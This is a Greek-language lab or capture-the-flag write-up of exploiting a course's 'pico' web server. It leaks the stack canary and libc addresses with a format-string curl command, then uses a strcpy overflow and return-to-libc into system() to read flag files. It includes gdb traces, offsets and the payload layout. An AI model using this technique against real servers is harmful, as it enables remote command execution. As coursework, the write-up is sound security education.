Διαβάζοντας προσεκτικά τον κώδικα του pico, παρατηρήσαμε μια strcpy() μέσα στην post_param() στην σειρά 178 του αρχείου main.c. Η strcpy() αυτή, όπως φαίνεται και από τα comments, γράφει στο buffer 'post_data' στη μνήμη, τα περιεχόμενα του payload, το οποίο απλά περιέχει ότι δεδομένα κάνουμε εμείς POST πριν κληθεί η post_param(). Ιδιαίτερα ενδιαφέρον είναι το γεγονός ότι το μέγεθος του buffer 'post_data', γίνεται set από την μεταβλητή 'payload_size' ή οποία παίρνει τιμή από το πεδίο **Content-Length** στα headers του http request (όπως φαίνεται από τις σειρές 174-176 του αρχείου httpd.c). Συνεπώς, γίνεται άμεσα εμφανές πως δίνοντας Content-Length=0 στα http headers μπορούμε να έχουμε πάντα το μέγεθος του buffer σταθερό και εν συνεχεία να κάνουμε κάποιο overflow στην μνήμη από το σημείο αυτό και πέρα, κάνοντας overwrite υπάρχοντες τιμές. Έτσι μπορούμε ενδεχομένως να κάλέσουμε κάποια συνάρτηση που κανονικά δεν θα μπορούσαμε, κάνοντας overwrite το return address value της συνάρτησης. 

Στη συνέχεια, διαβάζοντας τον κώδικα, παρατηρήσαμε την ύπαρξη δύο συναρτήσεων που θα μπορούσαμε να καλέσουμε μέσω του παραπάνω buffer overflow ώστε να αποκτήσουμε ενδεχομένως πρόσβαση στα directories που θέλουμε: της **send_file()** καθώς και την ύπαρξη της **system()**.

Σκεφτήκαμε πως στην πράξη τη κλήση της system() μας συνέφερε περισσότερο καθώς μας δίνει πολύ μεγαλύτερο έλεγχο στον server καθως μπορουμε να εκτελούμε ότι εντολή θέλουμε στην γραμμή εντολών του.

Για να εκμεταλλευτούμε το vunerability που εξηγήσαμε παραπάνω πρέπει στην πράξη να κάνουμε overflow το buffer 'post_data', κάνοντας overwrite την τοπική μνήμη της συνάρτησης στην στοίβα, μέχρι να αλλάξουμε την διεύθυνση επιστροφής της συνάρτησης (και τα ορίσματα της) ωστε στην ολοκλήρωση της εκτέλεσης της συνάρτησης, να κληθεί η συνάρτηση στόχος μας με τα επιθυμιτά μας ορίσματα. Σημαντικό στην όλη διαδικασία, είναι να διατηρήσουμε την τιμή του Canary στη μνήμη σταθερή, καθώς αν αλλάξει η τιμή αυτή, "εντοπίζεται" το buffer overflow μας, και η διαδικασία κρασάρει με 'stack smashed' error.

Συνεπώς, για το επιτυχές exploitation του vunerability χρειαστηκε να βρούμε τα εξής:

1. Την **τιμή του canary**, ώστε να μπορέσουμε να την διατηρήσουμε στην θέση της, και να αποφύγουμε οποιοδήποτε stack smashing error.

2. Την **θέση μνήμης του canary σε σχέση με την strcpy()** που είχαμε εντοπίσει (το entry point μας), ώστε να μπορέσουμε να ξανά τοποθετήσουμε την σωστή τιμή του canary στην θέση της.

3. Την **θέση μνήμης της διεύθυνσης επιστροφής** του function, ώστε να γνωρίζουμε ποια διεύθυνση πρέπει να τροποποιήσουμε για να καλέσουμε την επιθυμιτή μας συνάρτηση.

4. Την **διεύθυνση της system**, ώστε να μεταφέρουμε την εκτέλεση σε αυτή βάζοντάς την στην διεύθυνση επιστροφής.

5. Μια **διεύθυνση εσωτερικά της post_param** ώστε να μπορουμε να αναφερθούμε στο string το οποίο θα γράψουμε ως argument για την system.  

---

Οι τρόποι με τους οποίους βρήκαμε τελικά τα παραπάνω είναι οι ακόλουθοι:

1: **Τιμή του canary**

Σαν πρώτο βήμα αποφασίσαμε να την βρούμε τοπικά, μεταγλωττίζοντας τον pico server στο μηχάνημα linux02 της σχολής, το οποίο ξέραμε από την σημείωση `pico server, running on ?????, built on linux02.di.uoa.gr, gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)` στην http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/ ότι είχε χρησιμοποιηθεί για την μεταγλώτηση του pico που σερβίρει την ιστοσελίδα που μας ενδιαφέρει. Αυτή η λεπτομέρεια αποδειχτηκε πολύ σημαντική, καθώς έτσι ήμασταν σε θέση να γνωρίζουμε τον ακριβές κωδικά και την δομή που θα έχει το stack στον server.

Ετσί, προσπαθόντας να αξιοποιήσουμε την λειτουργιά disassemble του gdb άλλα και τον [Ghidra](https://ghidra-sre.org/ "Ghidra")  οδηγηθήκαμε σε αδιέξοδο το οποίο μας ώθησε σε έρευνα στο διαδίκτυο, από την οποία συμπεράναμε τις έξης πολύ βασικές πληροφορίες: 
 - (Α) Το canary βρίσκεται πάντα μεταξύ της μνήμης τοπικών μεταβλητών (εκεί που βρίσκεται και το buffer μας), και της μνήμης στην οποία είναι αποθηκευμένες οι τιμές των απαραίτητων καταχωρητών για την σωστή λειτουργία της στοίβας και την επιστροφή της συνάρτησης, ώστε να τις προστατεύσει από κάποιο overflow στα buffers της συνάρτησης. (https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/ και https://stackoverflow.com/questions/63024660/stack-corruption-detection-using-canary-value) 
 - (Β) Το canary θα τελειώνει με null byte ('00')  (https://ir0nstone.gitbook.io/notes/types/stack/canaries).

Μετά από αρκετά πειράματα, και αφού είχαμε εξοικειωθεί τόσο με τον gdb όσο και με τον τρόπο λειτουργίας της στοίβας, καταλήξαμε στο εξής workflow ώστε να εντοπίσουμε την θέση και κατα συνέπεια και την τιμή του canary τοπικά:
```
> gdb ./server
(gdb) b 177 // Set Breakpoint στη σειρά 177 του main.c (Στην πρώτη σειρά της post_parap, στην δήλωση του buffer post_data)
(gdb) set follow-fork-mode child // Ώστε ο gdb να ακολουθεί το παιδί του server το οποίο και εκτελέι τελικά την post_param
(gdb) run

Κάνουμε το εξής request στον σερβερ τωρα που τρέχει:
curl -u admin:admin 127.0.0.1:8000/check_secret.html -v -H "Content-Length:0"  -d "a"  

(gdb) x/16x $sp // Τύπωσε τα 16 επόμενα words μετά την τιμή του $sp ως raw bytes
0xffffd870:	0x5656c316	0x00000005	0x32ffd8d8	0x565573df
0xffffd880:	0x37393266	0x61373561	0x34376135	0x34393833
0xffffd890:	0x34653061	0x31303861	0x00336366	0x2bd8ea00
0xffffd8a0:	0x56558f04	0xf7fce000	0xffffd8e8	0x565561b8  // = οι αποθηκευμένοι ebx, ebp, esi και eip (Συμφωνα με την info frame)

(gdb) p &post_data // Τύπωσε την διεύθυνση της μεταβλητής post_data (του buffer μας)
$1 = (char (*)[879046754]) 0x31303861 // Η τρέχουσα διεύθυνση του buffer-στόχου μας

(gdb) info frame // Τύπωσε τις πληροφορίες του τρέχοντος stack frame 
Stack level 0, frame at 0xffffd8b0:
	eip = 0x5655681a in post_param (main.c:177); saved eip = 0x565561b8
	called by frame at 0xffffd8f0
	source language c.
	Arglist at 0xffffd8a8, args: param_name=0x565573df "secret"
	Locals at 0xffffd8a8, Previous frame's sp is 0xffffd8b0
	Saved registers:
  		ebx at 0xffffd8a0, ebp at 0xffffd8a8, esi at 0xffffd8a4, eip at 0xffffd8ac // Οι διευθύνσεις των καταχωρητών που θέλαμε

```
Στην πράξη, σταματάμε την εκτέλεση του προγράμματος όταν αυτή φτάσει στην post_param, και με την βοήθεια του gdb βλέπουμε τα περιεχόμενα της στοίβας καθώς και των καταχωρητών, ωστε να εντοπίσουμε την τιμή του canary, χρησιμοποιώντας τα (Α) και (Β) που αναφέρθηκαν παραπάνω. (Το canary πρέπει να βρίσκεται μεταξύ τοπικής μνήμης και αποθηκευμένων καταχωρητών ΚΑΙ να τελειώνει σε 00)

Από το output του παραπάνω παραδείγματος και τα (Α) και (Β), η τιμή του canary που προκύπτει είναι 0x2bd8ea00

Στην συνεχεία, χρειαζόμαστε έναν τρόπο να πάρουμε την τιμή του canary στον remote server. Αυτό, καταλήξαμε να το κάνουμε εκμεταλλευόμενοι το buffer overflow της printf() που κάναμε exploit στο ερώτημα 3. Εφόσον η τιμή του Canary παραμένει ίδια κατά την εκτέλεση μίας διεργασίας, μπορούμε να πάρουμε την τιμή του μέσω overflow στην printf (από την συνάρτηση check_auth δηλαδή) και να την "φυτέψουμε" στην θέση που μόλις βρήκαμε οτι πρέπει να βρίσκεται το canary στην μνήμη της post_param ώστε να μην γίνεται `stack smashed`. Έτσι, αρχικά βρήκαμε με την βοήθεια του gdb την τιμή του canary (όπως στο παραπάνω παράδειγμα) και γράψαμε ένα απλό script, το `curl_for_canary.sh` (βασισμένο στο `curl_for_3.sh` του ερωτήματος 3). Το script αυτό, δοθείσας της τιμής του canary, ελέγχει τις τιμές μνήμης μετά την printf() μια προς μια ώσπου να βρει την τιμή του canary. Μπορέσαμε να βρούμε πόσες θέσεις μνήμης μακριά από την printf() (και πόσα %x format specifiers) βρίσκεται η τιμή του canary. 

Αφού επιβεβαιώσαμε τοπικά ότι η μέθοδος που μόλις περιγράψαμε λειτουργεί, την εφαρμόσαμε στον απομακρυσμένο server του ερωτήματος με την ετνολή: 
`curl -v -u "%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x":password 127.0.0.1:8421`
όπου και βρήκαμε σαν τιμή του canary την `0x9ec3c600`, *που τελιώνει σε 00 όπως αναμέναμε από το (Β)*. Οπότε μπορούμε να βρίσκουμε την τιμή του canary ανα πάσα στιγμή με τον τρόπο αυτό.

2,3: **Θέση στη μνήμη του canary και της διεύθυνσης επιστροφής**

Με βάση το gdb workflow που περιγράψαμε παραπάνω, καθώς και τα (Α) και (Β) και έχοντας την παρακάτω εικόνα της μνήμης της συνάρτησης στην στοίβα, καταλήξουμε στην εξής "χαρτογράφηση" της μνήμης της post_param:
```
0xffffd870:	0x5656c316	0x00000005	0x32ffd8d8	0x565573df
0xffffd880:	0x37393266	0x61373561	0x34376135	0x34393833
0xffffd890:	0x34653061	0x31303861	0x00336366	0x2bd8ea00
0xffffd8a0:	0x56558f04	0xf7fce000	0xffffd8e8	0x565561b8
```

- [ 0x5656c316 μεχρι και 0x34653061] : 9 words - με άγνωστο περιεχόμενο
- [ 0x31303861 ] : 1 word - η διεύθυνση του buffer μας, post_data
- [ 0x00336366 ] : 1 word - με άγνωστο περιεχόμενο
- [ 0x2bd8ea00 ] : 1 word - canary
- [ 0x56558f04 ] : 1 word - ebx
- [ 0xf7fce000 ] : 1 word - ebp
- [ 0xffffd8e8 ] : 1 word - esi
- [ 0x565561b8 ] : 1 word - eip (Return address)

Έτσι, γνωρίζουμε πλέον την δομή της στοίβας και κατα συνέπεια και την δομή των δεδομένων που πρέπει να γράψουμε σε αυτή ώστε να πετύχουμε την επίθεση που επιθυμούμε.

4: **Διεύθυνση της system()**
Αρχικά, βρήκαμε την διεύθυνση της system προσθέτοντας μια printf εντώς του ROUTE_POST ώστε να μας το τυπώσει ο τοπικός server όταν κάνουμε κάποιο post request. 
```
    printf("\n\n\nSystem Address: %p\n\n\n", system);
    ... 
    POST request
    ...
    => System Address: 0xf7aa33d0
```

Συνεπώς, εμείς θέλουμε να βρούμε έναν τρόπο να βρίσκουμε την διεύθυνση αυτή στον remote server ώστε να κάνουμε return σε αυτή και να εκτελούμε την system. Ο μοναδικός τρόπος που μπορέσαμε να σκεφτούμε για να το κάνουμε αυτό, ήταν να βρούμε κάποιο offset από κάποια γνωστή μας διεύθυσνης (που να μπορούμνε να μάθουμε μέσω buffer overflow στην printf) ο συνδυασμός των οποίων να μας δίνει κάθε φορά την διεύθυνση της system στην μνήμη.

Για να το πετύχουμε αυτό, είναι απαραίτητο να βρούμε μια διεύθυνση η οποία να βρίσκεται στο ίδιο fragment της μνήμης με την system (πιθανόν την διεύθυνση κάποιας άλλης συνάρτησης της βασικής βιβλιοθήκης στην οποία ανοίκει και η system?). Η διεύθυνση που χρειαζόμαστε για να βρούμε το απαραίτητο offset, πρέπει να βρίσκεται στο ιδιο fragment με την system διότι αλλιώς δεν θα λειτουργήσει το offset που θα βρούμε. Γνωρίζουμε από προηγούμενα μαθήματα πως η κύρια μνήμη χωρίζεται σε fragmenτs, τα οποία στην πράξη "τεμαχίζουν" τα δεδομένα ωστε να μπορεί να τα φορτώνει/ξεφορτώνει δυναμικά ο επεξεργαστής στην μνήμη ανάλογα με το φόρτο του και την διαθεσιμότητα μνήμης. Έτσι, οποιοδήποτε offset βρούμε από διεύθυνση η οποία δεν ανοίκει στο ιδιο fragment με την system θα μας είναι εντελώς άχρηστο. Συνεπώς, αφού η διεύθυνση μνήμης τοπικά έχει την μορφή: `0xf7b...` θέλουμε μια διεύθυνση που να είναι όσο το δυνατόν πιο "κοντα" αριθμητικά στην διεύθυνση αυτή.

Παρατηρώντας το output του overflow 
`curl -v -u "%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x":password 127.0.0.1:8421`
από παραπάνω, 
```
57b55310  50        5662c52a  f7c3ed80 
       0  57b45335  5662f180  f7c3ed80 
       0  57b55310        59         0
       1  57b55310  57b55360  57b55361 
      50  ff90af58  f7ad6ff2  f7c3ed80 
       0         0         0  f7ad6fd7 
f7c3c880  f7c3ed80  4993cc00
```
παρατηρούμε αρκετές διευθύνσεις οι οποίες φαίνεται να βρίσκονται κοντά στην system αλλά οι φαινομενικά καλύτερες είνα οι `f7ad6fd7` και ή `f7ad6ff2`

Ετσι υπολογίσαμε το offset ως εξής: `0xf7ad6fd7 - 0xf7aa33d0 = 0x33C07 = 211975 (dec)`

Συνεπώς μπορούμε πλέον έχοντας την τιμή που βρίσκεται στην θέση της 0xf7ad6fd7 και προσθέτοντας 211975 να βρούμε την διεύθυνση μνήμης της system


5: **Διεύθυνση εσωτερικά της post_param**
Χρειαζόμαστε την διεύθυνση return address + 12 καθώς σύμφωνα με τις πηγές που βρήκαμε για το attack που προσπαθούμε (return-to-libc: https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc#diagram), πρέπει στην μνήμη να έχουμε μετά την διεύθυνση επιστροφής της post_param, την διευθυνση επιστροφής της συνάρτησης που καλούμε (συνήθως στη βιβλιογραφία εδώ μπαίνει η διεύθυνση της exit() αλλά δεν υπήρχε διαθέσιμη στην περίπτωση μας, και μετα τα arguments της συνάρτησης που θέλουμε να καλέσουμε (Στην δική μας περίπτωση ενα pointer στο buffer στο οποίο έχουμε γράψει την εντολή που θέλουμε να εκτελέσουμε μέσω της system). Άρα έχουμε:

- [canary_address + 16] eip (Return address)
- [eip_address + 4    ] exit() or garbage
- [eip_address + 8    ] pointer to the command buffer ( = eip_address + 12 )
- [eip_address + 12   ] the command buffer (example: "ls /"

Άρα χρειαζόμαστε την διεύθυνση eip_address + 12 για να την γράψουμε στην μνήμη στο eip_address + 8

Με βάση τον πειραματισμό μας απο το πώς βρήκαμε την διεύθυνση της system παραπάνω, ξέραμε οτι έπρεπε να βρούμε κάποιο offset μεταξύ κάποιου γνωστου word (από το overflow της printf) και της διεύθυνσης που θέλουμε να βρούμε. Ταυτόχρονα παρατηρήσαμε πως όταν τρέχαμε το πρόγραμμα με τον gdb οι διευθύνσεις ήταν πάντα ίδιες, σε αντίθεση με οταν τρέχαμε το πρόγραμμα χωρις gdb. Ετσι συνειδητοποιησαμε πως ο gdb απο default έχει κλειστό το address randomization.
Έτσι καταλήξαμε στο παρακάτω workflow για να βρούμε το offset που χρειαζόμαστε για να βρίσκουμε δυναμικά την διεύθυνση που ψάχνουμε:
```
(gdb) set disable-randomization off
(gdb) b httpd.c:52                    // Break ακριβως πριν το fork ωστε να ξέρουμε πότε πάει να τρέξει νέο παιδί
(gdb) run

> python3 5-return-to-libc.py          // GET request για το printf overflow

(gdb) c

// Σταματάει στο breakpoint ακριβώς πριν γίνει fork το process που θα εξυπηρετήσει το POST στο check_secret

(gdb) set follow-fork-mode child      // Για να ακολουθήσουμε το process που θα τρέξει την post_param
(gdb) b main.c:178                    // Break στην αρχή της post_param μόλις γίνει initialize η post_data
(gdb) b main.c:180                    // Break ακριβως μετά την strcpy ωστε να δούμε τα αποτελέσματα της
(gdb) c

```

Στα breakpoints τρέχουμε την x/24x $sp ωστε να δούμε τα περιεχόμενα του stack, να εντοπίσουμε τα word που θέλουμε να βρούμε και τις τιμές τους, με βάση το mapping του stack frame που έχουμε κάνει παραπάνω. 

Επίσης μπορούμε να δούμε το περιεχόμενο τοπικών μεταβλητών με την χρήση της 'p' (πχ: p &post_data) και των βασικών καταχωρητών με την 'info frame'

Στο παράδειγμα μας για την διεύθυνση που ψάχνουμε, βλέπουμε τα εξής:

```
To overflow της printf μας δίνει τα εξής:

     06a3e310 0000006f 56568511 f7c10d80 00000000 56a2e346 
     5656b180 f7c10d80 00000000 56a3e310 00000078 00000000 
     00000001 56a3e310 56a3e37f 56a3e380 0000006f ff9c8be8 
     f7aa8ff2 f7c10d80 00000000 00000000 00000000 f7aa8fd7 
     f7c0e880 f7c10d80 9764c600 f7c10d80 5656af04 ff9c8bf8 
     565680c2 5656b180 56a2e346 ff9c8bf8 56568075 f7c10ce0 
     565696e5

Και το παραπλανω workflow μας δίνει την εξής εικόνα της μνήμης:

	0xff9c8b70:	0x5656b186	0x00000000	0x56a3e310	0x565687ff
	0xff9c8b80:	0x56a3e316	0x00000005	0x329c8be8	0x565693ff
	0xff9c8b90:	0x37393266	0x61373561	0x34376135	0x34393833
	0xff9c8ba0:	0x00000000	0xff9c8b70	0x00336366	0x9764c600
	0xff9c8bb0:	0x5656af04	0xf7ee5004	0xff9c8bf8	0x565681b8
	0xff9c8bc0:	0x565693ff	0x56a2e300	0xff9c8bf8	0x56568075
```
Όμοια με τον τρόπο που βρήκαμε την διεύθυνση της system() ψάχνουμε μια διεύθυνση που να ξεκινάει με το ίδιο πρόθεμα με τις διευθύνσεις που βλέπουμε στην πτώτη στήλη (τη στήλη με τις διευθύνσεις) Για το script μας επιλέξαμε να βρούμε την διεύθυνση στην αρχή της γραμμής του canary δηλαδή την '0xff9c8ba0'.
Το word από το output της printf που είναι πιο κοντά στην διεύθυνση αυτή είναι ο αντίστοιχος esi της check_auth που γίνεται leak από την printf. Έτσι με μια απλή αφαίρεση, βρήκαμε το offset των δύο να είναι `0xff9c8bf8 - 0xff9c8ba0 = 0x58`. Εφόσον μπορούμε πλέον να βρίσκουμε έτσι την διεύθυνση της αρχής της σειράς του canary, μπορούμε πλεον να γνωρίζουμε την διεύθυνση οποιασδήποτε λέξης μέσα στην post_param. Έτσι, βρίσκουμε την διεύθυνση που ψάχνουμε `eip + 12 = 0xff9c8ba0 + 0x28 = 0xff9c8bf8 - 0x58 + 0x28`.


---

Έχοντας πλέον βρεί όλα όσα χρειαζόμαστε για να εκτελέσουμε την επίθεση, αρκεί λίγος πειραματισμός για να τα βάλουμε όλα μαζί ως εξής:
```
13 words - τυχαίο περιεχόμενο 
1  word  - το address της post_data ωστε να μην σκάει segmentation fault
1  word  - τυχαίο περιεχόμενο
1  word  - το canary ωστε να μην τρωει stack smashed
1  word  - ο ebx
1  word  - ο ebp
1  word  - ο esi
1  word  - return address - η διευθυνση της system
1  word  - τυχαιο περιεχόμενο
1  word  - pointer στο επομενο word
x  words - όσα words χρειαζονται για το string το οποίο θα δωθεί σαν argument στην system

 > Tις τιμές των post_data, ebx, edp και esi τις πήραμε με το workflow που περιγράφηκε παραπάνω για την εύρεση του address εντός της post_param 
 > Για τα words που λέμε οτι έχουν τυχαίο περιεχόμενο, αρκεί να μην έχει μέσα '\0' και σταματήσει την strcpy, εμεις επιλέξαμε να βάλουμε 
 'ffffffff' για να φαίνεται εύκολα με το μάτι στον debugger

Σημείωση 1: Το Canary περιέχει την τιμή '\0' η οποία σταματάει την strcpy, οπότε πρέπει να βρούμε κάποιο άλλο τρόπο να την γράψουμε στη μνήμη. 
Ευτυχώς για μας, στον κώδικα της post param, ακριβως μετά την strcpy, υπάρχει ένα loop το οποίο αντικαθιστά τους χαρακτήρες '&' και '=' με '\0' 
(λογικό γτ έτσι γίνονται εύκολα parse οι παράμετροι του url, αλλα η υλοποίηση αυτή που διευκόλυνε τον αρχικό προγραμματιστή του pico είναι 
και αυτή η οποία μας επιτρέπει τελικά να εισάγουμε την τιμή του canary με το 00 και να κάνουμε return-to-libc) 
Έτσι, στο script μας, αλλάζουμε το τελευταίο byte του canary από 0x00 σε 0x26 το οποίο είναι το '&' στ δεκαεξαδικό, 
και η for που αναφέραμε επαναφέρει το '00' στο τέλος του canary.

Σημείωση 2: Παρατηρήσαμε πως άμα δίναμε τις τιμές των λέξεων όπως τις λαμβάναμε από την printf, 
γράφονταν στη μνήμη ανάποδα, συνεπώς όπως θα δείτε έχουμε αντιστρέψει όλα τα words από big endian σε little endian 
ωστε να γράφονται με σωστή σειρά τα bytes τους.
```

Δημιουργώντας ένα binary payload με βάση τα παραπανω και στέλνοντας το στον σερβερ με το script 5-return-to-libc.py, μπορέσαμε να εκτελέσουμε όποιες εντολές θέλαμε μέσω της system()!

Αρχικά περιηγηθήκαμε για λίγο στα directories του server θέλοντας να βρούμε το '/secet/x' που ψάχναμε εξαρχης.
μετά από ενα `ls /` είδαμε το directory 'secet' και κάνοντας `cat /secet/x` βρήκαμε το μήνυμα:

```
Welcome to the YS13 oasis! <3

Over the past 5 years we've been evolving YS13 to fit a greater range of research activities
while also being in contact with fellow enterpreneurs who help us monetize and bring our goals
reality.

We have a long list of projects to get where we want, but our next priority is "Plan X":
that is, building an indoors greenhouse so that we can finally cultivate onions and avocados when we
send our initial colony on Saturn.

We are missing a "solar wind analyzer" to be able to proceed with this plan.
If you see this page and you have one, please bring it to the YS13 store and we will count you in as a project backer.

Love you big time!

PS. As always a big part of the YS13 mission is research. Reaching Saturn is not easy.
Lately we've been finishing the experiments for "Plan Y" which is finding the actual value of the ultimate coefficient.
Our supercomputer is working on it but it's taking forever.
(check /secet/y for some preliminary results, we need better accuracy to avoid destabilizing the space-plant continuum).
```
Ακολουθώντας την τελευταία σειρά, κάναμε `cat /secet/y` και πήραμε το εξής:
```
Computing, approximate answer: FLAG={41.99299141232}
...



Plan Z: troll humans who ask stupid questions (real fun).
I told them I need 7.5 million years to compute this XD

In the meanwhile I'm travelling through time trolling humans of the past.
Currently playing this clever dude using primitive hardware, he's good but the
next move is crushing...

1.e4 c6 2.d4 d5 3.Nc3 dxe4 4.Nxe4 Nd7 5.Ng5 Ngf6 6.Bd3 e6 7.N1f3 h6 8.Nxe6 Qe7 9.0-0 fxe6 10.Bg6+ Kd8 11.Bf4 b5 12.a4 Bb7 13.Re1 Nd5 14.Bg3 Kc8 15.axb5 cxb5 16.Qd3 Bc6 17.Bf5 exf5 18.Rxe7 Bxe7

PS. To reach me in the past use the code: FLAG={<next move><public IP of this machine>}
```
Το οποίο μας έδωσε και το flag του 5! FLAG={41.99299141232}


# Ερώτημα 6: Ποιο είναι το code του "Plan Z";
Από το τελευταίο μήνυμα του προηγούμενου ερωτήματος, έχουμε το flag του 6 ώς εξής: `FLAG={<next move><public IP of this machine>}`
	
1. Η επόμενη κίνηση από αυτές:
	```
	1.e4 c6 2.d4 d5 3.Nc3 dxe4 4.Nxe4 Nd7 5.Ng5 Ngf6 6.Bd3 e6 7.N1f3 h6 8.Nxe6 Qe7 9.0-0 fxe6 10.Bg6+ Kd8 11.Bf4 b5 12.a4 Bb7 13.Re1 Nd5 14.Bg3 Kc8 15.axb5 cxb5 16.Qd3 Bc6 17.Bf5 exf5 18.Rxe7 Bxe7
	```
	Με ένα γκουγκλάρισμα του παραπάνω string, οδηγηθήκαμε στην παραπάνω σελίδα https://www.kasparov.com/timeline-event/deep-blue/ απο την οποία μάθαμε πως οι κινήσεις αυτές είναι οι κινήσεις από το 6ο παιχνίδι σκακιού μεταξύ Garry Kasparov και Deep Blue και η τελευταία κίνηση, που ανάγκασε τον kasparov να παραιτηθεί, ήταν η 'c4'

2. H public ip του μηχανήματος:
	Την public ip την βρήκαμε απλά εκτελώντας την εντολή `curl ifconfig.me` με το script που είχαμε υλοποιήσει για το ερώτημα 5 και πήραμε ώς απάντηση `54.210.15.244`. Ενδιαφέρουσα σημείωση πως για κάποιο λόγο, αρκετές από τις διαφορετικές εντολές που δοκιμάσαμε πέρα της `curl ifconfig.me` δεν επέστρεψαν απάντηση - έκαναν time-out (https://opensource.com/article/18/5/how-find-ip-address-linux)

Από τα 1 και 2, το τελικό flag του ερωτήματος 6 είναι το FLAG={c454.210.15.244}
	
---

# Script run.sh

Υπάρχει το ζητούμενο script με όνομα run.sh, το οποίο μπορείτε να χρησιμοποιήσετε για την εκτέλεση των λύσεων των ερωτημάτων 3 με 6. Το script εκτελέστηκε χωρίς κανένα προβλήμα σε Pop!_OS 22.04 LTS (based on Ubuntu  22.04 LTS), άλλα και σε VM με xubuntu 20.04 LTS. Οπότε θεωρητικά δεν θα αντιμετωπίσετε κανένα πρόβλημα στην εκτέλεση του. Όμως, απαραίτητες προϋπόθεσεις ώστε να λειτουργήσει το script είναι:

- Λόγο της φύσης της εργασίας με σελίδες που φιλοξενούνται στο tor network, πρέπει να τρέχει στο παρασκήνιο ο tor browser και να λειτουργεί ο socks proxy στην 127.0.0.1:9050, ωστε να μπορούν τα διάφορα script να κάνουν request στο tor network. 

Ακόμα, το script χρησιμοποιεί:
- python3 `(έρχεται προ-εγκατεστημένη με τα Ubuntu 20.04)`.
- curl

Τέλος, παρακαλώ σημειώστε ότι κάποια attacks μπορεί να αργήσουν να βγάλουν αποτέλεσμα. Συγκεκριμένα το padding oracle attack του ερωτήματος 4 μπορεί να χρειαστεί έως και μισή ώρα, καθώς περιοριζόμαστε αρκετά από την ταχύτητα με την οποία πέρνουμε απάντηση από τον server μέσο tor.

Ενδεικτικά screenshots:

![image](https://user-images.githubusercontent.com/17359348/180054262-f2429ce8-7af6-4f98-966e-a5a39a4e0985.png)

---

![image](https://user-images.githubusercontent.com/17359348/180054275-74460bf3-2c26-41b0-b883-2f48925aef01.png)
![image](https://user-images.githubusercontent.com/17359348/180054477-56d23a37-3ff0-4689-824d-05fee5914faa.png)

---

![image](https://user-images.githubusercontent.com/17359348/180054495-d8513ec4-47cd-406c-820f-8969bc563b2f.png)
![image](https://user-images.githubusercontent.com/17359348/180054515-ab0d42f2-985b-48bd-9b0e-315186366339.png)




Αν έχετε οποιοδήποτε πρόβλημα στην εκτέλεση των scripts ή θέλετε κάποια διευκρίνιση μην διστάσετε να έρθετε σε επικοινωνία μαζί μας στα **[sdi1800164@di.uoa.gr](mailto:sdi1800164@di.uoa.gr)** ή **[sdi1800083@di.uoa.gr](mailto:sdi1800083@di.uoa.gr)**




